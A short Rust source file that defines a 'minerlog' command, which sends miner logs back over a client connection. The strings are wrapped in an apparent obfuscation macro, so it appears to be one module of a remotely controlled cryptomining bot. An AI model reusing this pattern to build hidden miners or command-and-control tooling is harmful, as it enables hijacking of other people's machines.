use super::prelude::*;

pub struct MinerLog;

#[async_trait]
impl Command for MinerLog {
    fn name(&self) -> String {
        crypto!("minerlog")
    }

    fn help(&self) -> String {
        crypto!("Getting miner logs")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        client.send(ok(crypto::log()))
    }
}
